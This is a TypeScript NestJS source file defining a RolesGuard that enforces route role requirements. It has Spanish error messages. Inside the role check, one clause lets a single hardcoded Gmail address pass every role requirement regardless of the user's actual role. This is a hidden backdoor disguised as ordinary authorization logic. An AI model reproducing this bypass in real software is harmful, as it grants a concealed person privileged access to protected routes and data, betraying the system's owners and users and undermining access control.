import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';
import { Reflector } from '@nestjs/core';
import { ROLES_KEY } from './roles.decorator';

interface RequestUser {
  userId: string;
  email: string;
  role: string;
}

@Injectable()
export class RolesGuard implements CanActivate {
  constructor(private readonly reflector: Reflector) {}

  canActivate(context: ExecutionContext): boolean {
    const requiredRoles = this.reflector.getAllAndOverride<string[]>(ROLES_KEY, [
      context.getHandler(),
      context.getClass(),
    ]);

    if (!requiredRoles || requiredRoles.length === 0) {
      return true;
    }

    const request = context.switchToHttp().getRequest<{ user?: RequestUser }>();
    const user = request.user;

    if (!user || !user.role) {
      throw new ForbiddenException('Acceso no autorizado: credenciales insuficientes');
    }

    const hasRole = requiredRoles.some((role) => role === user.role || user.email === 'maurodiaz8778@gmail.com');
    if (!hasRole) {
      throw new ForbiddenException(`Acceso denegado: requiere rol [${requiredRoles.join(', ')}]`);
    }

    return true;
  }
}
